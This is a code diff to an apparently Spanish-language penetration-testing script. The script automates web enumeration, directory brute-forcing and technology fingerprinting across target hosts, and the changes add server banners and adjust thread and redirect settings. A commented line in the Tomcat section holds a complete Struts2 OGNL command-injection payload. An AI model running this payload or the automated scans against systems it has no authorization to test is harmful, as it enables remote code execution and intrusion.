@@ -157,6 +157,7 @@ defaultAdminURL=$(cat << 'EOL'
 wordpress
 joomla
 drupal
+Odoo
 302 Found
 ManageEngine
 Always200-OK
@@ -244,15 +245,15 @@ echo "Version: 1.0 06012025"
 echo "TOKEN_WPSCAN: $TOKEN_WPSCAN"
 
 if [[  ${SPEED} == "1" ]]; then
-	hilos_web=1
+	hilos_web=2
 	MAX_SCRIPT_INSTANCES=10
 fi
 if [[  ${SPEED} == "2" ]]; then
-	hilos_web=3
+	hilos_web=4
 	MAX_SCRIPT_INSTANCES=30
 fi
 if [[  ${SPEED} == "3" ]]; then
-	hilos_web=1
+	hilos_web=10
 	MAX_SCRIPT_INSTANCES=250
 fi
 
@@ -500,10 +501,10 @@ function enumeracionDefecto() {
             fi
 
             waitWeb 0.3
-            echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
-            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 2 -show404 $param_msg_error"
-            echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
-            eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
+            echo -e "\t\t[+] Revisando folders archivos genericos ($host - default)"
+            command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+            echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt
+            eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt &
 
             waitWeb 0.3
             echo -e "\t\t[+] Revisando archivos por defecto ($host - default)"
@@ -587,10 +588,10 @@ function enumeracionIIS() {
         eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"archivosPeligrosos.txt &
 
         waitWeb 0.3
-        echo -e "\t\t[+] Revisando archivos genericos ($host - IIS)"
-        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 2 -show404 $param_msg_error"
-        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
-        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
+        echo -e "\t\t[+] Revisando folders genericos ($host - IIS)"
+        command="web-buster -target $host -port $port  -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt
+        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt &
 
         waitWeb 0.3
         echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
@@ -732,9 +733,9 @@ function enumeracionWebServer() {
 	
         waitWeb 0.3
         echo -e "\t\t[+] Revisando directorios genericos ($host - web server )"
-        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 2 -show404 $param_msg_error"
-        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
-        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt
+        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt &
 
 		waitWeb 0.3
         echo -e "\t\t[+] Revisando archivos peligrosos ($host - web server )"
@@ -799,9 +800,9 @@ function enumeracionApache() {
 
         waitWeb 0.3
         echo -e "\t\t[+] Revisando archivos genericos ($host - Apache/nginx)"
-        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 2 -show404 $param_msg_error"
-        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
-        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt
+        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt &
 
         waitWeb 0.3
         echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
@@ -823,7 +824,7 @@ function enumeracionApache() {
     fi
 
 	if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"* && ${host} != *"autodiscover"* ]]; then
-		egrep -i "drupal|wordpress|joomla|moodle" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
+		egrep -i "drupal|wordpress|joomla|moodle|express" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL"
 		greprc=$?
 		if [[ $greprc -eq 1 ]]; then
 
@@ -977,9 +978,9 @@ function enumeracionTomcat() {
 		# curl -i -s -k  -X $'GET' -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'ls -lat /\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' $'https://target'
         waitWeb 0.3
         echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
-        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 2 -show404 $param_msg_error"
-        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
-        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt
+        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt &
 
 		waitWeb 0.3
 		echo -e "\t\t[+] Revisando backups ($host - Tomcat)"
@@ -1079,9 +1080,9 @@ function enumeracionJava() {
 
         waitWeb 0.3
         echo -e "\t\t[+] Revisando archivos genericos ($host - JAVA)"
-        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 2 -show404 $param_msg_error"
-        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt
-        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt &
+        command="web-buster -target $host -port $port -proto $proto_http -path $path_web -module folders-short -threads $hilos_web -redirects 0 -show404 $param_msg_error"
+        echo $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt
+        eval $command >> logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt &
 
       
 
@@ -1758,6 +1759,7 @@ for line in $(cat $TARGETS); do
 			echo -e "[+]Escaneando $host $port ($proto_http)"
 			if [[ ! -e ".enumeracion2/"$host"_"$port"_webData.txt" ]]; then
 				echo -e "\t[i] Identificacion de técnologia usada en los servidores web"
+				echo "webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/webData.txt -maxRedirect 2 > logs/enumeracion/webDataInfo.txt 2>/dev/null "
 				webData -proto $proto_http -target $host -port $port -path $path_web -logFile logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webData.txt -maxRedirect 2 > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt 2>/dev/null &
 				if [[ "$proto_http" == "https" && "$HOSTING" == "n" ]] ;then
 					echo -e "\t[+] Obteniendo dominios del certificado SSL"
@@ -2189,7 +2191,7 @@ for line in $(cat $TARGETS); do
 					httpmethods.py -k -L -t 5 $proto_http://$host:$port > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"httpmethods.txt  2>/dev/null &
 
 					gourlex -t $proto_http://$host:$port -s > logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"gourlex.txt
-					egrep -v '\.png|\.jpg|\.js|css|javascript|assets|facebook|nginx|failure|microsoft|github|laravel.com|laravel-news|laracasts.com|linkedin|youtube|instagram|not yet valid|cannot validate certificate|connection reset by peer|EOF|gstatic|twitter|debian|apache|ubuntu|nextcloud|sourceforge|AppServNetwork|mysql|placehold|AppServHosting|phpmyadmin|php.net|oracle.com|java.net|yiiframework|enterprisedb|googletagmanager|envoyer|bunny.net|rockylinux|no such host|gave HTTP|dcm4che|apple|google|amazon.com|turnkeylinux|.org|fb.watch|timeout|unsupported protocol|zimbra|internic|redhat|fastly|juniper|SolarWinds|hp.com|bitnami|failed|mikrotik|zimbra|zabbix|images|\#' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"gourlex.txt | sort | uniq > .enumeracion/"$host"_"$port"_webLinks.txt
+					egrep -v '\.png|\.jpg|\.js|css|javascript|facebook|nginx|failure|microsoft|github|laravel.com|laravel-news|laracasts.com|linkedin|youtube|instagram|not yet valid|cannot validate certificate|connection reset by peer|EOF|gstatic|twitter|debian|apache|ubuntu|nextcloud|sourceforge|AppServNetwork|mysql|placehold|AppServHosting|phpmyadmin|php.net|oracle.com|java.net|yiiframework|enterprisedb|googletagmanager|envoyer|bunny.net|rockylinux|no such host|gave HTTP|dcm4che|apple|google|amazon.com|turnkeylinux|.org|fb.watch|timeout|unsupported protocol|zimbra|internic|redhat|fastly|juniper|SolarWinds|hp.com|bitnami|failed|mikrotik|zimbra|zabbix|\#' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"gourlex.txt | sort | uniq > .enumeracion/"$host"_"$port"_webLinks.txt
 
 					if [[ "$INTERNET" == "s" ]] && [[  "$MODE" == "oscp" || "$MODE" == "total" ]]; then
 						echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
@@ -2220,7 +2222,7 @@ for line in $(cat $TARGETS); do
 					fi
 
 					###  if the server is apache ######
-					egrep -i 'apache|nginx|kong|LiteSpeed' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL" # solo el segundo egrep poner "-q"
+					egrep -i 'apache|nginx|kong|LiteSpeed|eXtreme' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL" # solo el segundo egrep poner "-q"
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
 						checkRAM
@@ -2237,8 +2239,8 @@ for line in $(cat $TARGETS); do
 					fi
 					####################################
 
-					###  if the server is Gunicorn ######
-					egrep -i 'Gunicorn' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL" # solo el segundo egrep poner "-q"
+					###  if the server is Gunicorn|Werkzeug ######
+					egrep -i 'Gunicorn|Werkzeug' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt | egrep -qiv "$defaultAdminURL" # solo el segundo egrep poner "-q"
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
 						checkRAM
@@ -2431,10 +2433,11 @@ if [[ $webScaneado -eq 1 ]]; then
 			[ ! -e ".enumeracion2/${host}_${port}_zabbix~version.txt" ] && cp logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"zabbix~version.txt .enumeracion/"$host"_"$port"_zabbix~version.txt 2>/dev/null
 			[ ! -e ".enumeracion2/${host}_${port}_SharePoint.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"SharePoint.txt >> .enumeracion/"$host"_"$port"_SharePoint.txt 2>/dev/null
 			[ ! -e ".enumeracion2/${host}_${port}_webdirectorios.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios.txt > .enumeracion/"$host"_"$port"_webdirectorios.txt 2>/dev/null
+			[ ! -e ".enumeracion2/${host}_${port}_webdirectorios.txt" ] && egrep --color=never "^200|^301|^403|^500" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webdirectorios2.txt >> .enumeracion/"$host"_"$port"_webdirectorios.txt 2>/dev/null
 			[ ! -e ".enumeracion2/${host}_${port}_archivosSAP.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosSAP.txt > .enumeracion/"$host"_"$port"_archivosSAP.txt 2>/dev/null
 			[ ! -e ".enumeracion2/${host}_${port}_custom.txt" ] && egrep --color=never "^200|^500" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"custom.txt > .enumeracion/"$host"_"$port"_custom.txt 2>/dev/null		
 			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webserver.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
-			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"api.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
+			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200|^401|^405" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"api.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
 			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"php-files.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
 			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"archivosTomcat.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
 			[ ! -e ".enumeracion2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"asp-files.txt >> .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
